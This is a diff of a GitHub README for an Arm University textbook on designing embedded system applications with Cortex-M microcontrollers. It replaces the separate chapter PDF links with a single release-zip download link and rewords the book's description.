@@ -1,15 +1,14 @@
 ## A Beginner's-Guide-to-Designing-Embedded-System-Applications-on-Arm-Cortex-M-Microcontrollers
 
-Textbook by Ariel Lutenberg, Pablo Gomez & Eric Pernia
+## Important
+### To download the latest stable version, please click below instead of using the "Download ZIP" button.
+### [Click here to download](https://github.com/arm-university/A-Beginners-Guide-to-Designing-Embedded-System-Applications-on-Arm-Cortex-M-Microcontrollers/releases/download/v2.0.0/A-Beginners-Guide-to-Designing-Embedded-System-Applications-on-Arm-Cortex-M-Microcontrollers-main.zip)
+
+## About this Book
 
 Gain the essential skills to build an embedded system using this practical 'learn by doing' textbook.
 
-## [Download chapters 1-6 here](https://github.com/arm-university/A-Guide-to-Designing-Embedded-System-Applications-on-Arm-Cortex-M-Microcontrollers/blob/main/Beg.GuidetoDesigingEmbeddedSystems_ch1-6_textbook.pdf)
-
-## [Download chapters 7-12 here](https://github.com/arm-university/A-Guide-to-Designing-Embedded-System-Applications-on-Arm-Cortex-M-Microcontrollers/blob/main/Beg.GuidetoDesigingEmbeddedSystems_ch7-12_textbook.pdf)
-
-## About this Book
-This textbook is the perfect introduction for the beginner looking to enter the exciting world of embedded devices and IoT. Over the course of twelve chapters, readers will gain the practical skills needed to build a fully functional smart home device featuring a fire alarm, motion detector and security sensor.
+This textbook is by Ariel Lutenberg, Pablo Gomez & Eric Pernia is the perfect introduction for the beginner looking to enter the exciting world of embedded devices and IoT. Over the course of twelve chapters, readers will gain the practical skills needed to build a fully functional smart home device featuring a fire alarm, motion detector and security sensor.
 
 No prior knowledge of programming or electronics is assumed as the authors have adopted a 'learn-by-doing' approach. Basic ideas are explained and then demonstrated by means of examples that progressively introduce the fundamental concepts, techniques, and tools of embedded system design. All exercises are based on the ST Nucleo-F429ZI board, so readers can gain experience in implementing these key concepts on an industry-relevant Arm-based microcontroller.
 
